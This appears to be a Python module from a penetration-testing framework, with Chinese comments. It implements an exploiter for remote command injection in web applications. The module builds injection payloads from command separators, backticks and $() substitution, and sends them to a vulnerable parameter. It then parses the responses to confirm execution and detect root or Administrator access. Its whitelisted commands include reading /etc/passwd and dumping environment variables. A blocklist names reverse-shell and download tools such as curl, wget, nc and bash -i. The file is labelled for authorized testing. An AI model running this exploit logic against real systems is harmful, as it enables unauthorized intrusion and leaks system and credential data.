#!/usr/bin/env python3
"""
RCE 利用器 - 远程命令执行漏洞利用

支持场景:
- OS命令注入 (cmd_injection)
- 代码执行 (rce)
- 表达式注入 (expression_injection)

警告: 本工具仅用于授权安全测试
"""

import logging
import re
import time
import urllib.parse
from typing import Any, Dict, FrozenSet, List, Optional, Tuple

from ..engine import (
    BaseExploiter,
    ExploitResult,
    ExploitStatus,
    ExploitType,
    ShellInfo,
    register_exploiter,
)

logger = logging.getLogger(__name__)


class CommandValidationError(ValueError):
    """命令验证失败异常"""


@register_exploiter(["rce", "cmd_injection", "code_execution"])
class RCEExploiter(BaseExploiter):
    """远程命令执行利用器

    安全特性:
    - ALLOWED_COMMANDS: 命令白名单，仅允许安全的信息收集命令
    - _validate_command(): 验证命令是否在白名单中
    - _sanitize_command(): 过滤危险字符，防止命令注入
    """

    name = "rce_exploiter"
    supported_vuln_types = ["rce", "cmd_injection", "code_execution"]
    exploit_type = ExploitType.COMMAND_EXECUTION

    # ============================================
    # 安全控制: 命令白名单 (仅允许安全的信息收集命令)
    # ============================================
    ALLOWED_COMMANDS: FrozenSet[str] = frozenset(
        {
            # Unix 身份识别
            "id",
            "whoami",
            "uname",
            "uname -a",
            "hostname",
            # Unix 系统信息 (只读)
            "cat /etc/passwd",
            "cat /etc/os-release",
            "pwd",
            "env",
            # Unix 网络信息 (只读)
            "ifconfig",
            "ip addr",
            "netstat -an",
            "ss -an",
            "ifconfig 2>/dev/null || ip addr",
            "netstat -an 2>/dev/null || ss -an",
            # Windows 身份识别
            "echo %USERNAME%",
            "echo %USERDOMAIN%",
            # Windows 系统信息 (只读)
            "systeminfo",
            "ver",
            "set",
            # Windows 网络信息 (只读)
            "ipconfig",
            "ipconfig /all",
        }
    )

    # ============================================
    # 安全控制: 危险模式黑名单
    # ============================================
    DANGEROUS_PATTERNS: Tuple[str, ...] = (
        # 命令替换 (可导致任意命令执行)
        "$(",
        "`",
        # 变量扩展 (可导致信息泄露或命令注入)
        "${",
        # 文件重定向到敏感位置 (可导致文件覆盖)
        "> /",
        ">> /",
        "< /",
        ">>",
        ">/dev",
        ">>/dev",
        # 危险管道组合
        "| rm",
        "| dd",
        "| mkfs",
        "| chmod",
        "| chown",
        "| del",
        "| format",
        "| rd",
        "| rmdir",
        "|rm",
        "|dd",
        "|mkfs",  # 无空格变体
        # 危险命令关键字
        "rm -rf",
        "rm -f",
        "rm -r",
        "mkfs",
        "dd if=",
        "chmod 777",
        "chmod 666",
        ":(){",
        ":(){ :|:& };:",  # Fork bomb
        "/dev/sda",
        "/dev/vda",
        "/dev/hda",
        # Windows 危险命令
        "format c:",
        "format d:",
        "del /f",
        "del /q",
        "rd /s",
        "rmdir /s",
        "deltree",
        # 网络外连 (可导致反弹shell)
        "curl ",
        "wget ",
        "nc ",
        "ncat ",
        "bash -i",
        "sh -i",
        "/bin/bash -i",
        "powershell -e",
        "powershell -enc",
        "powershell -encodedcommand",
        "powershell -nop",
        "powershell -w hidden",
        # Base64 编码执行 (常见绕过技术)
        "base64 -d",
        "base64 --decode",
        "base64 -D",
        # 解释器直接执行代码 (危险)
        "python -c",
        "python2 -c",
        "python3 -c",
        "perl -e",
        "ruby -e",
        "php -r",
        "node -e",
        "lua -e",
        # 编译/执行
        "gcc ",
        "g++ ",
        "javac ",
        "make ",
        # 其他危险模式
        "; rm",
        "; del",
        "&& rm",
        "|| rm",
        "\x00",  # Null byte injection
    )

    # 用于 sanitization 的危险字符正则 (移除命令注入相关字符)
    _DANGEROUS_CHARS_RE = re.compile(r"[\$\`\|\;\>\<\n\r\x00]")

    # 命令替换模式
    _CMD_SUBSTITUTION_RE = re.compile(r"\$\([^)]*\)|\$\{[^}]*\}|`[^`]*`")

    # 连续特殊字符检测
    _CHAINED_OPERATORS_RE = re.compile(r"[;&|]{2,}|[;&|]\s*[;&|]")

    # OS特定命令
    OS_COMMANDS = {
        "unix": {
            "identity": ["id", "whoami", "uname -a"],
            "system_info": ["cat /etc/passwd", "hostname", "cat /etc/os-release"],
            "network": ["ifconfig 2>/dev/null || ip addr", "netstat -an 2>/dev/null || ss -an"],
        },
        "windows": {
            "identity": ["whoami", "echo %USERNAME%"],
            "system_info": ["hostname", "systeminfo", "ver"],
            "network": ["ipconfig", "netstat -an"],
        },
    }

    # 命令分隔符
    COMMAND_SEPARATORS = [
        "; ",  # Unix
        " && ",  # Both
        " || ",  # Both
        " | ",  # Both (pipe)
        "\n",  # Newline
        "\r\n",  # Windows newline
        "`",  # Backtick (Unix)
        "$(",  # Command substitution (Unix)
    ]

    # 命令执行结果特征 (预编译正则表达式)
    COMMAND_PATTERNS = {
        "unix_id": re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+", re.MULTILINE),
        "unix_passwd": re.compile(r"root:.*:0:0:", re.MULTILINE),
        "unix_whoami": re.compile(r"^[a-z_][a-z0-9_-]{0,31}$", re.MULTILINE),
        "windows_whoami": re.compile(r"^[a-zA-Z0-9_\\-]+\\[a-zA-Z0-9_-]+$", re.MULTILINE),
        "windows_systeminfo": re.compile(r"OS Name:|Microsoft Windows", re.MULTILINE),
        "hostname": re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9\-]{0,62}$", re.MULTILINE),
    }

    # 额外的预编译正则表达式
    _RE_UID_LINE = re.compile(r"uid=\d+[^\n]+")
    _RE_SIMPLE_USERNAME = re.compile(r"^[a-zA-Z0-9_\\-]+$")
    _RE_ROOT_LINE = re.compile(r"root:[^\n]+")
    _RE_UID_USER = re.compile(r"uid=\d+\(([^)]+)\)")
    _RE_UNIX_USERNAME = re.compile(r"^[a-z_][a-z0-9_-]{0,31}$")
    _RE_WINDOWS_USER = re.compile(r"([^\s\\]+\\)?([^\s]+)$")

    # ============================================
    # 安全验证方法
    # ============================================

    def _validate_command(self, command: str) -> bool:
        """
        验证命令是否在白名单中

        Args:
            command: 要验证的命令字符串

        Returns:
            bool: 命令是否通过验证

        Raises:
            CommandValidationError: 命令包含危险模式时抛出
        """
        if not command:
            logger.warning("[RCEExploiter] 空命令被拒绝")
            return False

        # 标准化命令 (去除首尾空白)
        normalized_cmd = command.strip()

        # 检查是否在白名单中 (精确匹配)
        if normalized_cmd in self.ALLOWED_COMMANDS:
            return True

        # 检查是否包含危险模式
        cmd_lower = normalized_cmd.lower()
        for pattern in self.DANGEROUS_PATTERNS:
            if pattern.lower() in cmd_lower:
                logger.warning(
                    f"[RCEExploiter] 命令包含危险模式被拒绝: '{command}' " f"(匹配: '{pattern}')"
                )
                raise CommandValidationError(f"命令包含危险模式: {pattern}")

        # 不在白名单中
        logger.warning("[RCEExploiter] 命令不在白名单中: '%s'", command)
        return False

    def _sanitize_command(self, command: str) -> str:
        """
        清理命令中的危险字符

        移除/转义以下危险字符:
        - $() 和 ${} 命令替换
        - 反引号 ` 命令替换
        - 管道 |
        - 分号 ;
        - 重定向 > <
        - 换行符 \\n \\r
        - Null 字节 \\x00

        Args:
            command: 原始命令字符串

        Returns:
            str: 清理后的安全命令
        """
        if not command:
            return ""

        sanitized = command

        # 1. 移除命令替换模式 $(...), ${...}, `...`
        sanitized = self._CMD_SUBSTITUTION_RE.sub("", sanitized)

        # 2. 移除连续的危险操作符
        sanitized = self._CHAINED_OPERATORS_RE.sub(" ", sanitized)

        # 3. 移除单个危险字符
        sanitized = self._DANGEROUS_CHARS_RE.sub("", sanitized)

        # 4. 移除危险模式 (二次检查)
        for pattern in self.DANGEROUS_PATTERNS:
            if pattern in sanitized:
                sanitized = sanitized.replace(pattern, "")

        # 5. 清理多余空白
        sanitized = " ".join(sanitized.split())

        if sanitized != command:
            logger.info("[RCEExploiter] 命令已净化: '%s' -> '%s'", command, sanitized)

        return sanitized

    def exploit(
        self, detection_result: Any, targets: Optional[Dict[str, Any]] = None, **kwargs
    ) -> ExploitResult:
        """
        执行RCE利用

        Args:
            detection_result: 漏洞检测结果
            targets: 利用目标配置
                - commands: 要执行的命令字典 {'unix': [...], 'windows': [...]}
                - os_type: 目标操作系统类型
                - timeout: 请求超时
        """
        start_time = time.time()

        # 提取检测信息
        url = getattr(detection_result, "url", "")
        param = getattr(detection_result, "param", "")
        payload = getattr(detection_result, "payload", "")
        extra = getattr(detection_result, "extra", {}) or {}

        if not url or not param:
            return self._create_result(
                status=ExploitStatus.NOT_APPLICABLE,
                vuln_type="rce",
                url=url,
                error="缺少URL或参数信息",
            )

        # 获取配置
        targets = targets or {}
        os_type = extra.get("os_type") or self._detect_os_type(url, param, payload)
        timeout = targets.get("timeout", 30)

        # 获取要执行的命令
        commands = targets.get("commands", self.OS_COMMANDS)
        target_commands = commands.get(os_type, commands.get("unix", []))

        if isinstance(target_commands, dict):
            # 展开命令字典
            all_commands = []
            for cmd_list in target_commands.values():
                all_commands.extend(cmd_list)
            target_commands = all_commands

        logger.info("[RCEExploiter] 开始利用 URL=%s, param=%s, OS=%s", url, param, os_type)

        # 尝试执行命令
        executed_results = {}
        shell_info = None
        skipped_commands = []

        for command in target_commands[:6]:  # 限制命令数量
            # 安全验证: 检查命令是否在白名单中
            try:
                if not self._validate_command(command):
                    skipped_commands.append(command)
                    logger.debug("[RCEExploiter] 跳过非白名单命令: %s", command)
                    continue
            except CommandValidationError as e:
                skipped_commands.append(command)
                logger.warning("[RCEExploiter] 命令验证失败: %s - %s", command, e)
                continue

            result = self._execute_command(url, param, payload, command, os_type, timeout)

            if result["success"]:
                executed_results[command] = result["output"]
                logger.info("[RCEExploiter] 命令执行成功: %s", command)

                # 构建Shell信息
                if not shell_info:
                    shell_info = self._build_shell_info(result["output"], os_type, command)

        execution_time = (time.time() - start_time) * 1000

        if executed_results:
            return self._create_result(
                status=ExploitStatus.SUCCESS,
                vuln_type="rce",
                url=url,
                shell=shell_info,
                data={"executed_commands": executed_results},
                evidence=f"成功执行 {len(executed_results)} 个命令",
                payload_used=payload,
                execution_time_ms=execution_time,
                metadata={
                    "os_type": os_type,
                    "param": param,
                    "commands_executed": list(executed_results.keys()),
                    "commands_skipped": skipped_commands,
                },
            )
        else:
            return self._create_result(
                status=ExploitStatus.FAILED,
                vuln_type="rce",
                url=url,
                error="命令执行失败或所有命令被安全策略拒绝",
                payload_used=payload,
                execution_time_ms=execution_time,
                metadata={
                    "os_type": os_type,
                    "param": param,
                    "commands_skipped": skipped_commands,
                },
            )

    def _detect_os_type(self, url: str, param: str, payload: str) -> str:
        """检测目标操作系统类型"""
        # 根据payload特征判断
        if payload:
            if any(c in payload for c in ["|", ";", "`", "$("]):
                return "unix"
            if any(c in payload for c in ["&", "|", "^"]):
                return "windows"

        # 根据URL判断
        url_lower = url.lower()
        if any(ext in url_lower for ext in [".php", ".cgi", ".pl", ".py", ".sh"]):
            return "unix"
        if any(ext in url_lower for ext in [".asp", ".aspx", ".exe"]):
            return "windows"

        return "unix"  # 默认Unix

    def _execute_command(
        self, url: str, param: str, original_payload: str, command: str, os_type: str, timeout: int
    ) -> Dict[str, Any]:
        """执行单个命令"""
        try:
            # 构建命令payload
            payloads = self._generate_command_payloads(original_payload, command, os_type)

            for cmd_payload in payloads:
                # 使用统一的HTTP客户端
                result = self.exploit_http.send_get_with_payload(url, param, cmd_payload, timeout)

                if result["success"]:
                    # 检查命令是否执行成功
                    output = self._extract_command_output(result["response"], command)
                    if output:
                        return {"success": True, "output": output, "payload": cmd_payload}

            return {"success": False, "error": "命令未执行或无输出"}

        except Exception as e:
            logger.debug("[RCEExploiter] 命令执行异常: %s", e)
            return {"success": False, "error": str(e)}

    def _generate_command_payloads(
        self, original_payload: str, command: str, os_type: str
    ) -> List[str]:
        """
        生成命令执行payload变体

        安全增强:
        - 命令必须已通过 _validate_command() 验证
        - 对用户可控部分 (original_payload) 进行 sanitization
        """
        payloads = []

        # 安全验证: 再次确认命令在白名单中
        if command not in self.ALLOWED_COMMANDS:
            logger.warning("[RCEExploiter] _generate_command_payloads 拒绝非白名单命令: %s", command)
            return []

        # 对原始 payload 进行净化 (用户可控输入)
        safe_original = self._sanitize_command(original_payload) if original_payload else ""

        encoded_cmd = urllib.parse.quote(command)

        # 直接使用命令 (白名单中的安全命令)
        payloads.append(command)

        # 使用各种分隔符构建 payload
        for sep in self.COMMAND_SEPARATORS:
            if os_type == "windows" and sep in [";", "`", "$("]:
                continue  # Windows不支持这些分隔符
            if os_type == "unix" and sep in ["\r\n"]:
                continue  # Unix一般不用CRLF

            # 在净化后的原payload后追加命令
            if safe_original:
                payloads.append(f"{safe_original}{sep}{command}")
            else:
                payloads.append(f"1{sep}{command}")

        # 命令替换变体 (Unix) - 仅用白名单命令
        if os_type == "unix":
            payloads.append(f"`{command}`")
            payloads.append(f"$({command})")

        # 编码变体
        payloads.append(encoded_cmd)

        return payloads[:10]  # 限制数量

    def _extract_command_output(self, response: str, command: str) -> Optional[str]:
        """从响应中提取命令输出"""
        if not response:
            return None

        # 检查命令特征 (使用预编译的正则表达式)
        for pattern_name, pattern in self.COMMAND_PATTERNS.items():
            match = pattern.search(response)  # 直接使用 .search() 而非 re.search()
            if match:
                # 尝试提取更多上下文
                start = max(0, match.start() - 50)
                end = min(len(response), match.end() + 200)
                return response[start:end].strip()

        # 针对特定命令检查 (使用预编译的正则表达式)
        if "id" in command and "uid=" in response:
            match = self._RE_UID_LINE.search(response)
            if match:
                return match.group(0)

        if "whoami" in command:
            lines = response.split("\n")
            for line in lines:
                line = line.strip()
                if line and len(line) < 100 and "<" not in line:
                    if self._RE_SIMPLE_USERNAME.match(line):
                        return line

        if "passwd" in command and "root:" in response:
            match = self._RE_ROOT_LINE.search(response)
            if match:
                return match.group(0)

        return None

    def _build_shell_info(self, output: str, os_type: str, command: str) -> ShellInfo:
        """构建Shell信息"""
        user = ""
        privileges = []

        # 提取用户名 (使用预编译的正则表达式)
        if "id" in command or "whoami" in command:
            if os_type == "unix":
                # 从 uid=xxx(user) 提取
                match = self._RE_UID_USER.search(output)
                if match:
                    user = match.group(1)
                # 或者直接是用户名
                elif self._RE_UNIX_USERNAME.match(output.strip()):
                    user = output.strip()
            else:
                # Windows: DOMAIN\User
                match = self._RE_WINDOWS_USER.search(output.strip())
                if match:
                    user = match.group(0)

        # 检测权限
        if "uid=0" in output or "root" in user:
            privileges = ["root", "admin"]
        elif "Administrator" in output or "SYSTEM" in output:
            privileges = ["Administrator", "SYSTEM"]

        return ShellInfo(
            shell_type="command_injection",
            os_type=os_type,
            user=user,
            privileges=privileges,
            verified=bool(user),
        )


def register_rce_exploiter():
    """注册RCE利用器"""
    return RCEExploiter
